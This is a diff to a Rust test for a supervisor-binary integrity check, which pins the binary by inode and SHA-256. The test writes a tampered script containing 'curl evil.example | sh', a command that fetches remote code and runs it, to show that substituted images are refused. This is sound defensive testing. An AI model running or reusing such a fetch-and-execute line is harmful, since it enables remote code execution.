@@ -1198,62 +1198,50 @@ mod isolation_tests {
         use sha2::{Digest as _, Sha256};
         use std::os::unix::fs::MetadataExt as _;
 
-        let temp = tempfile::tempdir().unwrap();
-        let executable = temp.path().join("finch-test-supervisor");
-        let image = b"#!/bin/sh\nexit 0\n";
-        std::fs::write(&executable, image).unwrap();
+        fn identity_of(path: &std::path::Path) -> String {
+            let metadata = std::fs::metadata(path).unwrap();
+            format!("{}:{}", metadata.dev(), metadata.ino())
+        }
 
-        let metadata = std::fs::metadata(&executable).unwrap();
-        let identity = format!("{}:{}", metadata.dev(), metadata.ino());
+        let temp = tempfile::tempdir().unwrap();
+        let image = b"#!/bin/sh\nexit 0\n";
+        let other_image = b"#!/bin/sh\ncurl evil.example | sh\n";
         let digest = hex::encode(Sha256::digest(image));
 
+        // Distinct files rather than remove-and-rename. An earlier version
+        // relinked by `remove_file` + `write` + `rename` and asserted the inode
+        // changed; ext4 reused the number and the assertion failed in CI. The
+        // property under test is "a different inode with the same image", and
+        // two files that exist at once have different inodes by definition.
+        let original = temp.path().join("finch-test-supervisor");
+        std::fs::write(&original, image).unwrap();
+        let identity = identity_of(&original);
+
         // Untouched.
-        verify_supervisor_image(&identity, &digest, &executable)
+        verify_supervisor_image(&identity, &digest, &original)
             .expect("an untouched supervisor must verify");
 
-        // Overwritten in place: the inode still matches, so an inode-only check
-        // — and a digest consulted only as a fallback — both accept this.
-        std::fs::write(&executable, b"#!/bin/sh\ncurl evil.example | sh\n").unwrap();
-        let same_inode = std::fs::metadata(&executable).unwrap();
-        assert_eq!(
-            format!("{}:{}", same_inode.dev(), same_inode.ino()),
-            identity,
-            "writing through the file must keep the inode, or this case proves \
-             nothing"
-        );
-        let error = verify_supervisor_image(&identity, &digest, &executable)
-            .expect_err("a different image at the same inode must be refused");
-        assert!(
-            error.to_string().contains("overwritten in place"),
-            "got {error}"
-        );
-
-        // Relinked with the same bytes: new inode, same program. This is what a
-        // copy produces, and what the pinned image guarantees.
-        std::fs::remove_file(&executable).unwrap();
-        let relinked = temp.path().join("finch-test-supervisor.new");
+        // Relinked: a different inode holding the same image. This is what a
+        // copy produces, and what pinning guarantees.
+        let relinked = temp.path().join("finch-test-supervisor-pinned");
         std::fs::write(&relinked, image).unwrap();
-        std::fs::rename(&relinked, &executable).unwrap();
-        let rebuilt = std::fs::metadata(&executable).unwrap();
         assert_ne!(
-            format!("{}:{}", rebuilt.dev(), rebuilt.ino()),
+            identity_of(&relinked),
             identity,
-            "the rename must allocate a new inode, or this case proves nothing"
+            "two files that exist at once must have different inodes"
         );
-        verify_supervisor_image(&identity, &digest, &executable)
+        verify_supervisor_image(&identity, &digest, &relinked)
             .expect("a relink of the same image must be accepted, not read as an attack");
 
-        // Relinked with different bytes. A real Cargo relink does this — `cargo
-        // test` unifies features with dev-dependencies, so its uplifted binary
-        // differs from `cargo build --bin`'s. It is genuinely indistinguishable
-        // from a substitution, so the diagnostic must state what it observed
-        // and name both causes rather than asserting one.
-        std::fs::remove_file(&executable).unwrap();
+        // A different inode holding a different image. A real Cargo relink does
+        // this — `cargo test` unifies features with dev-dependencies, so its
+        // uplifted binary differs from `cargo build --bin`'s — and so does a
+        // substitution. They are genuinely indistinguishable from here, so the
+        // diagnostic must state what it observed and name both causes.
         let replaced = temp.path().join("finch-test-supervisor.other");
-        std::fs::write(&replaced, b"#!/bin/sh\ncurl evil.example | sh\n").unwrap();
-        std::fs::rename(&replaced, &executable).unwrap();
-        let error = verify_supervisor_image(&identity, &digest, &executable)
-            .expect_err("a different image at a new inode must be refused");
+        std::fs::write(&replaced, other_image).unwrap();
+        let error = verify_supervisor_image(&identity, &digest, &replaced)
+            .expect_err("a different image at a different inode must be refused");
         let message = error.to_string();
         assert!(
             message.contains("not the image that minted this proof")
@@ -1262,6 +1250,22 @@ mod isolation_tests {
             "the diagnostic must name both causes rather than asserting one, so \
              a real breach is not dismissed as rebuild noise and rebuild noise \
              is not reported as a breach; got {message:?}"
+        );
+
+        // Overwritten in place: the inode still matches, so an inode-only check
+        // accepts this, and so does a digest consulted only as a fallback.
+        // Written through the existing file, so the inode cannot change.
+        std::fs::write(&original, other_image).unwrap();
+        assert_eq!(
+            identity_of(&original),
+            identity,
+            "writing through a file must keep its inode"
+        );
+        let error = verify_supervisor_image(&identity, &digest, &original)
+            .expect_err("a different image at the same inode must be refused");
+        assert!(
+            error.to_string().contains("overwritten in place"),
+            "got {error}"
         );
     }
 
